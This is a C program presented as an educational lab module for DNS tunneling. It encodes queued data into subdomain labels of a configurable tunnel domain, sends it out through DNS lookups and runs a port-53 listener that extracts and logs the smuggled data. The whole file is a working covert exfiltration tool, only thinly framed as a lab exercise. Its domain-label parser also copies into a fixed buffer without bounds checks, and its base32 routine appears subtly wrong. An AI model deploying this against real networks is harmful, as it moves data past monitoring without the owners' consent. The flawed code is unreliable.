/*
 * Educational DNS Tunneling Module
 * Demonstrates covert channel concepts for lab use only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pthread.h>
#include <time.h>
#include <syslog.h>
#include <ctype.h>

#define DNS_PORT 53
#define MAX_DOMAIN_SIZE 253
#define MAX_LABEL_SIZE 63
#define CHUNK_SIZE 32
#define QUEUE_SIZE 1000

// DNS packet structures
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

// Data queue for exfiltration
struct data_queue {
    char data[QUEUE_SIZE][256];
    int head;
    int tail;
    pthread_mutex_t mutex;
    pthread_cond_t cond;
};

static struct data_queue exfil_queue = {
    .head = 0,
    .tail = 0,
    .mutex = PTHREAD_MUTEX_INITIALIZER,
    .cond = PTHREAD_COND_INITIALIZER
};

static int running = 1;
static char tunnel_domain[256] = "tunnel.lab.local";

// Base32 encoding for DNS-safe data transmission
static const char base32_alphabet[] = "abcdefghijklmnopqrstuvwxyz234567";

void base32_encode(const unsigned char *data, int length, char *result) {
    int i, j;
    unsigned char current;
    
    for (i = 0, j = 0; i < length; i += 5, j += 8) {
        current = (i < length) ? data[i] : 0;
        result[j] = base32_alphabet[current >> 3];
        current = ((current & 0x07) << 2);
        
        if (i + 1 < length) {
            current |= (data[i + 1] >> 6);
            result[j + 1] = base32_alphabet[current];
            current = (data[i + 1] >> 1) & 0x1f;
            result[j + 2] = base32_alphabet[current];
            current = (data[i + 1] & 0x01) << 4;
        } else {
            result[j + 1] = base32_alphabet[current];
            result[j + 2] = '=';
            current = 0;
        }
        
        if (i + 2 < length) {
            current |= (data[i + 2] >> 4);
            result[j + 3] = base32_alphabet[current];
            current = (data[i + 2] & 0x0f) << 1;
        } else {
            result[j + 3] = base32_alphabet[current];
            current = 0;
        }
        
        if (i + 3 < length) {
            current |= (data[i + 3] >> 7);
            result[j + 4] = base32_alphabet[current];
            current = (data[i + 3] >> 2) & 0x1f;
            result[j + 5] = base32_alphabet[current];
            current = (data[i + 3] & 0x03) << 3;
        } else {
            result[j + 4] = base32_alphabet[current];
            result[j + 5] = '=';
            current = 0;
        }
        
        if (i + 4 < length) {
            current |= (data[i + 4] >> 5);
            result[j + 6] = base32_alphabet[current];
            current = data[i + 4] & 0x1f;
            result[j + 7] = base32_alphabet[current];
        } else {
            result[j + 6] = base32_alphabet[current];
            result[j + 7] = '=';
        }
    }
    
    result[j] = '\0';
}

void queue_data_for_exfil(const char *data) {
    pthread_mutex_lock(&exfil_queue.mutex);
    
    if ((exfil_queue.head + 1) % QUEUE_SIZE != exfil_queue.tail) {
        strncpy(exfil_queue.data[exfil_queue.head], data, 255);
        exfil_queue.data[exfil_queue.head][255] = '\0';
        exfil_queue.head = (exfil_queue.head + 1) % QUEUE_SIZE;
        pthread_cond_signal(&exfil_queue.cond);
    }
    
    pthread_mutex_unlock(&exfil_queue.mutex);
}

void *dns_exfil_thread(void *arg) {
    char data[256];
    char encoded[512];
    char dns_query[1024];
    struct hostent *host;
    
    syslog(LOG_INFO, "DNS exfiltration thread started");
    
    while (running) {
        pthread_mutex_lock(&exfil_queue.mutex);
        
        while (exfil_queue.tail == exfil_queue.head && running) {
            pthread_cond_wait(&exfil_queue.cond, &exfil_queue.mutex);
        }
        
        if (!running) {
            pthread_mutex_unlock(&exfil_queue.mutex);
            break;
        }
        
        strncpy(data, exfil_queue.data[exfil_queue.tail], 255);
        exfil_queue.tail = (exfil_queue.tail + 1) % QUEUE_SIZE;
        
        pthread_mutex_unlock(&exfil_queue.mutex);
        
        // Encode data for DNS
        base32_encode((unsigned char *)data, strlen(data), encoded);
        
        // Create DNS query with encoded data as subdomain
        snprintf(dns_query, sizeof(dns_query), "%s.%s", encoded, tunnel_domain);
        
        // Make DNS query (this will be intercepted by our DNS server)
        host = gethostbyname(dns_query);
        
        if (host) {
            syslog(LOG_DEBUG, "DNS exfil successful: %s", dns_query);
        } else {
            syslog(LOG_WARNING, "DNS exfil failed: %s", dns_query);
        }
        
        // Rate limiting
        usleep(100000); // 100ms delay
    }
    
    return NULL;
}

void *dns_server_thread(void *arg) {
    int sockfd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    unsigned char buffer[512];
    
    syslog(LOG_INFO, "DNS server thread started");
    
    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        syslog(LOG_ERR, "Failed to create DNS socket");
        return NULL;
    }
    
    // Bind to DNS port
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(DNS_PORT);
    
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        syslog(LOG_ERR, "Failed to bind DNS socket");
        close(sockfd);
        return NULL;
    }
    
    while (running) {
        int len = recvfrom(sockfd, buffer, sizeof(buffer), 0,
                          (struct sockaddr *)&client_addr, &client_len);
        
        if (len > 0) {
            // Parse DNS query
            struct dns_header *header = (struct dns_header *)buffer;
            
            // Log query for educational purposes
            syslog(LOG_DEBUG, "DNS query received from %s",
                   inet_ntoa(client_addr.sin_addr));
            
            // Check if this is a tunnel query
            char domain[256];
            int pos = sizeof(struct dns_header);
            int i = 0;
            
            while (pos < len && buffer[pos] != 0) {
                int label_len = buffer[pos];
                pos++;
                
                if (i > 0) domain[i++] = '.';
                
                memcpy(domain + i, buffer + pos, label_len);
                i += label_len;
                pos += label_len;
            }
            domain[i] = '\0';
            
            if (strstr(domain, tunnel_domain)) {
                // This is a tunnel query - extract and log data
                char *encoded_data = domain;
                char *dot = strchr(encoded_data, '.');
                if (dot) *dot = '\0';
                
                syslog(LOG_INFO, "Tunnel data received: %s", encoded_data);
                
                // Send response
                buffer[2] |= 0x80; // Set response flag
                buffer[3] = 0x80;  // No error
                
                // Add answer count
                buffer[6] = 0;
                buffer[7] = 1;
                
                // Copy question
                int response_len = len;
                
                // Add answer (A record with dummy IP)
                buffer[response_len++] = 0xc0; // Pointer to domain name
                buffer[response_len++] = 0x0c;
                
                // Type A
                buffer[response_len++] = 0x00;
                buffer[response_len++] = 0x01;
                
                // Class IN
                buffer[response_len++] = 0x00;
                buffer[response_len++] = 0x01;
                
                // TTL (60 seconds)
                buffer[response_len++] = 0x00;
                buffer[response_len++] = 0x00;
                buffer[response_len++] = 0x00;
                buffer[response_len++] = 0x3c;
                
                // Data length (4 bytes for IP)
                buffer[response_len++] = 0x00;
                buffer[response_len++] = 0x04;
                
                // IP address (127.0.0.1)
                buffer[response_len++] = 127;
                buffer[response_len++] = 0;
                buffer[response_len++] = 0;
                buffer[response_len++] = 1;
                
                sendto(sockfd, buffer, response_len, 0,
                       (struct sockaddr *)&client_addr, client_len);
            }
        }
    }
    
    close(sockfd);
    return NULL;
}

int main(int argc, char **argv) {
    pthread_t exfil_thread, server_thread;
    
    openlog("dns-tunnel", LOG_PID | LOG_CONS, LOG_DAEMON);
    syslog(LOG_INFO, "Educational DNS Tunnel starting...");
    
    // Parse arguments
    if (argc > 1) {
        strncpy(tunnel_domain, argv[1], sizeof(tunnel_domain) - 1);
    }
    
    // Start threads
    pthread_create(&server_thread, NULL, dns_server_thread, NULL);
    pthread_create(&exfil_thread, NULL, dns_exfil_thread, NULL);
    
    // Example: Queue some test data
    queue_data_for_exfil("TEST-DATA-FROM-LAB");
    
    // Wait for threads
    pthread_join(server_thread, NULL);
    pthread_join(exfil_thread, NULL);
    
    syslog(LOG_INFO, "DNS Tunnel shutting down");
    closelog();
    
    return 0;
}